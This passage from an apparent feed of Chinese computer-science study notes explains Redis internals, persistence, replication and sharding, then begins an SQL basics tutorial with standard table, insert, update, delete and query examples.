<div><pre><code>> zadd zset-key 728 member1
(integer) 1
> zadd zset-key 982 member0
(integer) 1
> zadd zset-key 982 member0
(integer) 0

> zrange zset-key 0 -1 withscores
1) "member1"
2) "728"
3) "member0"
4) "982"

> zrangebyscore zset-key 0 800 withscores
1) "member1"
2) "728"

> zrem zset-key member1
(integer) 1
> zrem zset-key member1
(integer) 0

> zrange zset-key 0 -1 withscores
1) "member0"
2) "982"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h3 id="数据结构实现-4" tabindex="-1"> 数据结构实现</h3>
<ul>
<li>ziplist:</li>
<li>zskiplist</li>
</ul>
<h4 id="跳跃表" tabindex="-1"> 跳跃表</h4>
<p>是有序集合的底层实现之一。</p>
<p>跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/beba612e-dc5b-4fc2-869d-0b23408ac90a.png" width="600px"/> </div><br>
<p>在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。下图演示了查找 22 的过程。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0ea37ee2-c224-4c79-b895-e131c6805c40.png" width="600px"/> </div><br>
<p>与红黑树等平衡树相比，跳跃表具有以下优点：</p>
<ul>
<li>插入速度非常快速，因为不需要进行旋转等操作来维护平衡性；</li>
<li>更容易实现；</li>
<li>支持无锁操作。</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-09-01-10-39-00.png" alt="" loading="lazy"></p>
<p>展示了一个跳跃表示例， 位于图片最左边的是 zskiplist 结构， 该结构包含以下属性：</p>
<blockquote></blockquote>
<ul>
<li>header ：指向跳跃表的表头节点。</li>
<li>tail ：指向跳跃表的表尾节点。</li>
<li>level ：记录目前跳跃表内，层数最大的那个节点的层数（表头节点的层数不计算在内）。</li>
<li>length ：记录跳跃表的长度，也即是，跳跃表目前包含节点的数量（表头节点不计算在内）。</li>
</ul>
<p>zskiplist 结构右边的是四个 zskiplistNode 结构， 该结构包含以下属性：</p>
<ul>
<li>层（level）：节点中用 L1 、 L2 、 L3 等字样标记节点的各个层， L1 代表第一层， L2 代表第二层，以此类推。每个层都带有两个属性：前进指针和跨度。前进指针用于访问位于表尾方向的其他节点，而跨度则记录了前进指针所指向节点和当前节点的距离。在上面的图片中，连线上带有数字的箭头就代表&gt;前进指针，而那个数字就是跨度。当程序从表头向表尾进行遍历时，访问会沿着层的前进指针进行。</li>
<li>后退指针（backward）：节点中用 BW 字样标记节点的后退指针，它指向位于当前节点的前一个节点。后退指针在程序从表尾向表头遍历时使用。</li>
<li>分值（score）：各个节点中的 1.0 、 2.0 和 3.0 是节点所保存的分值。在跳跃表中，节点按各自所保存的分值从小到大排列。</li>
<li>成员对象（obj）：各个节点中的 o1 、 o2 和 o3 是节点所保存的成员对象。</li>
</ul>
<p>注意表头节点和其他节点的构造是一样的： 表头节点也有后退指针、分值和成员对象， 不过表头节点的这些属性都不会被用到， 所以图中省略了这些部分， 只显示了表头节点的各个层。</p>
<h1 id="三、使用场景" tabindex="-1"> 三、使用场景</h1>
<h2 id="计数器" tabindex="-1"> 计数器</h2>
<p>可以对 String 进行自增自减运算，从而实现计数器功能。</p>
<p>Redis 这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。</p>
<h2 id="缓存" tabindex="-1"> 缓存</h2>
<p>将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。</p>
<h2 id="查找表" tabindex="-1"> 查找表</h2>
<p>例如 DNS 记录就很适合使用 Redis 进行存储。</p>
<p>查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。</p>
<h2 id="消息队列" tabindex="-1"> 消息队列</h2>
<p>List 是一个双向链表，可以通过 lpush 和 rpop 写入和读取消息</p>
<p>不过最好使用 Kafka、RabbitMQ 等消息中间件。</p>
<h2 id="会话缓存" tabindex="-1"> 会话缓存</h2>
<p>可以使用 Redis 来统一存储多台应用服务器的会话信息。</p>
<p>当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。</p>
<h2 id="分布式锁实现" tabindex="-1"> 分布式锁实现</h2>
<p>在分布式场景下，无法使用单机环境下的锁来对多个节点上的进程进行同步。</p>
<p>可以使用 Redis 自带的 SETNX 命令实现分布式锁，除此之外，还可以使用官方提供的 RedLock 分布式锁实现。</p>
<h2 id="其它" tabindex="-1"> 其它</h2>
<p>Set 可以实现交集、并集等操作，从而实现共同好友等功能。</p>
<p>ZSet 可以实现有序性操作，从而实现排行榜等功能。</p>
<h1 id="四、redis-与-memcached" tabindex="-1"> 四、Redis 与 Memcached</h1>
<p>两者都是非关系型内存键值数据库，主要有以下不同：</p>
<h2 id="数据类型" tabindex="-1"> 数据类型</h2>
<p>Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。</p>
<h2 id="数据持久化" tabindex="-1"> 数据持久化</h2>
<p>Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。</p>
<h2 id="分布式" tabindex="-1"> 分布式</h2>
<p>Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。</p>
<p>Redis Cluster 实现了分布式的支持。</p>
<h2 id="内存管理机制" tabindex="-1"> 内存管理机制</h2>
<ul>
<li>
<p>在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。</p>
</li>
<li>
<p>Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。</p>
</li>
</ul>
<h1 id="五、键的过期时间" tabindex="-1"> 五、键的过期时间</h1>
<p>Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。</p>
<p>对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。</p>
<h2 id="删除策略" tabindex="-1"> 删除策略</h2>
<table>
<thead>
<tr>
<th>删除策略</th>
<th>对比结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>定时删除</td>
<td>1.节约内存,无占用 2.不分时段占用CPU资源,频度高 3.拿时间换空间</td>
</tr>
<tr>
<td>惰性删除</td>
<td>1.内存占用严重 2.延时执行,CPU利用率高 3.拿空间换时间</td>
</tr>
<tr>
<td>定期删除</td>
<td>1.内存定期随机清理 2.每秒花费固定的CPU资源维护内存 3.随机抽查,重点抽查</td>
</tr>
</tbody>
</table>
<p>Redis 采用的是 定期删除+惰性/懒汉式删除</p>
<p>仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就Out of memory了。</p>
<p>怎么解决这个问题呢？答案就是： Redis 内存淘汰机制。</p>
<h1 id="六、数据淘汰策略" tabindex="-1"> 六、数据淘汰策略</h1>
<p>可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。</p>
<p>Redis 具体有 6 种淘汰策略：</p>
<table>
<thead>
<tr>
<th style="text-align:center">策略</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">volatile-lru</td>
<td style="text-align:center">从已设置过期时间的数据集中挑选最近最少使用的数据淘汰</td>
</tr>
<tr>
<td style="text-align:center">volatile-ttl</td>
<td style="text-align:center">从已设置过期时间的数据集中挑选将要过期的数据淘汰</td>
</tr>
<tr>
<td style="text-align:center">volatile-random</td>
<td style="text-align:center">从已设置过期时间的数据集中任意选择数据淘汰</td>
</tr>
<tr>
<td style="text-align:center">allkeys-lru</td>
<td style="text-align:center">从所有数据集中挑选最近最少使用的数据淘汰</td>
</tr>
<tr>
<td style="text-align:center">allkeys-random</td>
<td style="text-align:center">从所有数据集中任意选择数据进行淘汰</td>
</tr>
<tr>
<td style="text-align:center">noeviction</td>
<td style="text-align:center">禁止驱逐数据</td>
</tr>
</tbody>
</table>
<p>作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法实际实现上并非针对所有 key，而是抽样一小部分并且从中选出被淘汰的 key。</p>
<p>使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。</p>
<p>Redis 4.0 引入了 volatile-lfu 和 allkeys-lfu 淘汰策略，LFU 策略通过统计访问频率，将访问频率最少的键值对淘汰。</p>
<h1 id="七、持久化" tabindex="-1"> 七、持久化</h1>
<p>Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。</p>
<h2 id="rdb-持久化-全量模式持久化" tabindex="-1"> RDB 持久化 全量模式持久化</h2>
<p>将某个时间点的所有数据都存放到硬盘上。</p>
<p>可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。</p>
<p>如果系统发生故障，将会丢失最后一次创建快照之后的数据。</p>
<p>如果数据量很大，保存快照的时间会很长。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-24-38.png" alt="" title=":size=500" loading="lazy"></p>
<h2 id="aof-持久化-增量模式持久化" tabindex="-1"> AOF 持久化 增量模式持久化</h2>
<p>将写命令添加到 AOF 文件（Append Only File）的末尾。</p>
<p>使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：</p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:center">同步频率</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">always</td>
<td style="text-align:center">每个写命令都同步</td>
</tr>
<tr>
<td style="text-align:center">everysec</td>
<td style="text-align:center">每秒同步一次</td>
</tr>
<tr>
<td style="text-align:center">no</td>
<td style="text-align:center">让操作系统来决定何时同步</td>
</tr>
</tbody>
</table>
<ul>
<li>always 选项会严重减低服务器的性能；</li>
<li>everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响；</li>
<li>no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-24-26.png" alt="" title=":size=500" loading="lazy"></p>
<p>随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。</p>
<p>AOF 重写可以产生一个新的 AOF 文件，这个新的 AOF 文件和原有的 AOF 文件所保存的数据库状态一样，但体积更小。</p>
<p>AOF 重写是一个有歧义的名字，该功能是通过读取数据库中的键值对来实现的，程序无须对现有 AOF 文件进行任何读入、分析或者写入操作。</p>
<p>在执行 BGREWRITEAOF 命令时，Redis 服务器会维护一个 AOF 重写缓冲区，该缓冲区会在子进程创建新 AOF 文件期间，记录服务器执行的所有写命令。当子进程完成创建新 AOF 文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新 AOF 文件的末尾，使得新旧两个 AOF 文件所保存的数据库状态一致。最后，服务器用新的 AOF 文件替换旧的 AOF 文件，以此来完成 AOF 文件重写操作</p>
<h1 id="八、事务" tabindex="-1"> 八、事务</h1>
<p>一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。</p>
<p>事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。</p>
<p>Redis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。</p>
<h1 id="九、事件" tabindex="-1"> 九、事件</h1>
<p>Redis 服务器是一个事件驱动程序。</p>
<h2 id="文件事件" tabindex="-1"> 文件事件</h2>
<p>服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。</p>
<p>Redis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9ea86eb5-000a-4281-b948-7b567bd6f1d8.png" width=""/> </div><br>
<p>注意！ Redis 6.0 之后的版本抛弃了单线程模型这一设计，原本使用单线程运行的 Redis 也开始选择性地使用多线程模型。</p>
<p>前面还在强调 Redis 单线程模型的高效性，现在为什么又要引入多线程？这其实说明 Redis 在有些方面，单线程已经不具有优势了。因为读写网络的 Read/Write 系统调用在 Redis 执行期间占用了大部分 CPU 时间，如果把网络读写做成多线程的方式对性能会有很大提升。</p>
<p>Redis 的多线程部分只是用来处理网络数据的读写和协议解析，执行命令仍然是单线程。 之所以这么设计是不想 Redis 因为多线程而变得复杂，需要去控制 key、lua、事务、LPUSH/LPOP 等等的并发问题。</p>
<h2 id="时间事件" tabindex="-1"> 时间事件</h2>
<p>服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。</p>
<p>时间事件又分为：</p>
<ul>
<li>定时事件：是让一段程序在指定的时间之内执行一次；</li>
<li>周期性事件：是让一段程序每隔指定时间就执行一次。</li>
</ul>
<p>Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。</p>
<h2 id="事件的调度与执行" tabindex="-1"> 事件的调度与执行</h2>
<p>服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。</p>
<p>事件调度与执行由 aeProcessEvents 函数负责，伪代码如下：</p>
<div><pre><code><span>def</span> <span>aeProcessEvents</span><span>(</span><span>)</span><span>:</span>
    <span># 获取到达时间离当前时间最接近的时间事件</span>
    time_event <span>=</span> aeSearchNearestTimer<span>(</span><span>)</span>
    <span># 计算最接近的时间事件距离到达还有多少毫秒</span>
    remaind_ms <span>=</span> time_event<span>.</span>when <span>-</span> unix_ts_now<span>(</span><span>)</span>
    <span># 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0</span>
    <span>if</span> remaind_ms <span>&lt;</span> <span>0</span><span>:</span>
        remaind_ms <span>=</span> <span>0</span>
    <span># 根据 remaind_ms 的值，创建 timeval</span>
    timeval <span>=</span> create_timeval_with_ms<span>(</span>remaind_ms<span>)</span>
    <span># 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定</span>
    aeApiPoll<span>(</span>timeval<span>)</span>
    <span># 处理所有已产生的文件事件</span>
    procesFileEvents<span>(</span><span>)</span>
    <span># 处理所有已到达的时间事件</span>
    processTimeEvents<span>(</span><span>)</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><p>将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下：</p>
<div><pre><code><span>def</span> <span>main</span><span>(</span><span>)</span><span>:</span>
    <span># 初始化服务器</span>
    init_server<span>(</span><span>)</span>
    <span># 一直处理事件，直到服务器关闭为止</span>
    <span>while</span> server_is_not_shutdown<span>(</span><span>)</span><span>:</span>
        aeProcessEvents<span>(</span><span>)</span>
    <span># 服务器关闭，执行清理操作</span>
    clean_server<span>(</span><span>)</span>
</code></pre></div><p>从事件处理的角度来看，服务器运行流程如下：</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0a9fa91-da2e-4892-8c9f-80206a6f7047.png" width="350"/> </div><br>
<h1 id="十、复制" tabindex="-1"> 十、复制</h1>
<p>通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。</p>
<p>一个从服务器只能有一个主服务器，并且不支持主主复制。</p>
<h2 id="连接过程" tabindex="-1"> 连接过程</h2>
<ol>
<li>
<p>主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令；</p>
</li>
<li>
<p>从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令；</p>
</li>
<li>
<p>主服务器每执行一次写命令，就向从服务器发送相同的写命令。</p>
</li>
</ol>
<h2 id="主从链" tabindex="-1"> 主从链</h2>
<p>随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/395a9e83-b1a1-4a1d-b170-d081e7bb5bab.png" width="600"/> </div><br>
<h1 id="十一、sentinel" tabindex="-1"> 十一、Sentinel</h1>
<p>Sentinel（哨兵）可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。</p>
<h1 id="十二、分片" tabindex="-1"> 十二、分片</h1>
<p>分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，这种方法在解决某些问题时可以获得线性级别的性能提升。</p>
<p>假设有 4 个 Redis 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，... ，有不同的方式来选择一个指定的键存储在哪个实例中。</p>
<ul>
<li>最简单的方式是范围分片，例如用户 id 从 0~1000 的存储到实例 R0 中，用户 id 从 1001~2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。</li>
<li>还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。</li>
</ul>
<p>根据执行分片的位置，可以分为三种分片方式：</p>
<ul>
<li>客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。</li>
<li>代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。</li>
<li>服务器分片：Redis Cluster。</li>
</ul>
<h1 id="十三、一个简单的论坛系统分析" tabindex="-1"> 十三、一个简单的论坛系统分析</h1>
<p>该论坛系统功能如下：</p>
<ul>
<li>可以发布文章；</li>
<li>可以对文章进行点赞；</li>
<li>在首页可以按文章的发布时间或者文章的点赞数进行排序显示。</li>
</ul>
<h2 id="文章信息" tabindex="-1"> 文章信息</h2>
<p>文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。</p>
<p>Redis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c54de21-e2ff-402e-bc42-4037de1c1592.png" width="400"/> </div><br>
<h2 id="点赞功能" tabindex="-1"> 点赞功能</h2>
<p>当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。</p>
<p>为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/485fdf34-ccf8-4185-97c6-17374ee719a0.png" width="400"/> </div><br>
<h2 id="对文章进行排序" tabindex="-1"> 对文章进行排序</h2>
<p>为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的）</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f7d170a3-e446-4a64-ac2d-cb95028f81a8.png" width="800"/> </div>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013.</li>
<li><a href="http://redisbook.com/index.html" target="_blank" rel="noopener noreferrer">黄健宏. Redis 设计与实现 [M]. 机械工业出版社, 2014.</a></li>
<li><a href="https://redislabs.com/ebook/foreword/" target="_blank" rel="noopener noreferrer">REDIS IN ACTION</a></li>
<li><a href="http://ticki.github.io/blog/skip-lists-done-right/" target="_blank" rel="noopener noreferrer">Skip Lists: Done Right</a></li>
<li><a href="http://www.cnblogs.com/loveincode/p/7411911.html" target="_blank" rel="noopener noreferrer">论述 Redis 和 Memcached 的差异</a></li>
<li><a href="http://wiki.jikexueyuan.com/project/redis-guide" target="_blank" rel="noopener noreferrer">Redis 3.0 中文版- 分片</a></li>
<li><a href="http://www.scienjus.com/redis-use-case/" target="_blank" rel="noopener noreferrer">Redis 应用场景</a></li>
<li><a href="https://redis.io/topics/lru-cache" target="_blank" rel="noopener noreferrer">Using Redis as an LRU cache</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">SQL</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>

<h1 id="一、基础" tabindex="-1"> 一、基础</h1>
<p>模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。</p>
<p>主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。</p>
<p>SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。</p>
<p>SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。</p>
<p>SQL 支持以下三种注释：</p>
<div><pre><code><span># 注释</span>
<span>SELECT</span> <span>*</span>
<span>FROM</span> mytable<span>;</span> <span>-- 注释</span>
<span>/* 注释1
   注释2 */</span>
</code></pre></div><p>数据库创建与使用：</p>
<div><pre><code><span>CREATE</span> <span>DATABASE</span> test<span>;</span>
<span>USE</span> test<span>;</span>
</code></pre></div><h1 id="二、创建表" tabindex="-1"> 二、创建表</h1>
<div><pre><code><span>CREATE</span> <span>TABLE</span> mytable <span>(</span>
  <span># int 类型，不为空，自增</span>
  id <span>INT</span> <span>NOT</span> <span>NULL</span> <span>AUTO_INCREMENT</span><span>,</span>
  <span># int 类型，不可为空，默认值为 1，不为空</span>
  col1 <span>INT</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>1</span><span>,</span>
  <span># 变长字符串类型，最长为 45 个字符，可以为空</span>
  col2 <span>VARCHAR</span><span>(</span><span>45</span><span>)</span> <span>NULL</span><span>,</span>
  <span># 日期类型，可为空</span>
  col3 <span>DATE</span> <span>NULL</span><span>,</span>
  <span># 设置主键为 id</span>
  <span>PRIMARY</span> <span>KEY</span> <span>(</span><span><span>`</span>id<span>`</span></span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h1 id="三、修改表" tabindex="-1"> 三、修改表</h1>
<p>添加列</p>
<div><pre><code><span>ALTER</span> <span>TABLE</span> mytable
<span>ADD</span> col <span>CHAR</span><span>(</span><span>20</span><span>)</span><span>;</span>
</code></pre></div><p>删除列</p>
<div><pre><code><span>ALTER</span> <span>TABLE</span> mytable
<span>DROP</span> <span>COLUMN</span> col<span>;</span>
</code></pre></div><p>删除表</p>
<div><pre><code><span>DROP</span> <span>TABLE</span> mytable<span>;</span>
</code></pre></div><h1 id="四、插入" tabindex="-1"> 四、插入</h1>
<p>普通插入</p>
<div><pre><code><span>INSERT</span> <span>INTO</span> mytable<span>(</span>col1<span>,</span> col2<span>)</span>
<span>VALUES</span><span>(</span>val1<span>,</span> val2<span>)</span><span>;</span>
</code></pre></div><p>插入检索出来的数据</p>
<div><pre><code><span>INSERT</span> <span>INTO</span> mytable1<span>(</span>col1<span>,</span> col2<span>)</span>
<span>SELECT</span> col1<span>,</span> col2
<span>FROM</span> mytable2<span>;</span>
</code></pre></div><p>将一个表的内容插入到一个新表</p>
<div><pre><code><span>CREATE</span> <span>TABLE</span> newtable <span>AS</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> mytable<span>;</span>
</code></pre></div><h1 id="五、更新" tabindex="-1"> 五、更新</h1>
<div><pre><code><span>UPDATE</span> mytable
<span>SET</span> col <span>=</span> val
<span>WHERE</span> id <span>=</span> <span>1</span><span>;</span>
</code></pre></div><h1 id="六、删除" tabindex="-1"> 六、删除</h1>
<div><pre><code><span>DELETE</span> <span>FROM</span> mytable
<span>WHERE</span> id <span>=</span> <span>1</span><span>;</span>
</code></pre></div><p><strong>TRUNCATE TABLE</strong>  可以清空表，也就是删除所有行。</p>
<div><pre><code><span>TRUNCATE</span> <span>TABLE</span> mytable<span>;</span>
</code></pre></div><p>使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。</p>
<h1 id="七、查询" tabindex="-1"> 七、查询</h1>
<h2 id="distinct" tabindex="-1"> DISTINCT</h2>
<p>相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。</p>
<div><pre><code><span>SELECT</span> <span>DISTINCT</span> col1<span>,</span> col2
<span>FROM</span> mytable<span>;</span>
</code></pre></div><h2 id="limit" tabindex="-1"> LIMIT</h2>
<p>限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。</p>
<p>返回前 5 行：</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>LIMIT</span> <span>5</span><span>;</span>
</code></pre></div><div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>LIMIT</span> <span>0</span><span>,</span> <span>5</span><span>;</span>
</code></pre></div><p>返回第 3 ~ 5 行：</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>LIMIT</span> <span>2</span><span>,</span> <span>3</span><span>;</span>
</code></pre></div><h1 id="八、排序" tabindex="-1"> 八、排序</h1>
<ul>
<li><strong>ASC</strong> ：升序（默认）</li>
<li><strong>DESC</strong> ：降序</li>
</ul>
<p>可以按多个列进行排序，并且为每个列指定不同的排序方式：</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>ORDER</span> <span>BY</span> col1 <span>DESC</span><span>,</span> col2 <span>ASC</span><span>;</span>
</code></pre></div><h1 id="九、过滤" tabindex="-1"> 九、过滤</h1>
<p>不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>WHERE</span> col <span>IS</span> <span>NULL</span><span>;</span>
</code></pre></div><p>下表显示了 WHERE 子句可用的操作符</p>
<table>
<thead>
<tr>
<th style="text-align:center">操作符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">等于</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">小于</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">大于</td>
</tr>
<tr>
<td style="text-align:center">&lt;&gt; !=</td>
<td style="text-align:center">不等于</td>
</tr>
<tr>
<td style="text-align:center">&lt;= !&gt;</td>
<td style="text-align:center">小于等于</td>
</tr>
<tr>
<td style="text-align:center">&gt;= !&lt;</td>
<td style="text-align:center">大于等于</td>
</tr>
<tr>
<td style="text-align:center">BETWEEN</td>
<td style="text-align:center">在两个值之间</td>
</tr>
<tr>
<td style="text-align:center">IS NULL</td>
<td style="text-align:center">为 NULL 值</td>
</tr>
</tbody>
</table>
<p>应该注意到，NULL 与 0、空字符串都不同。</p>
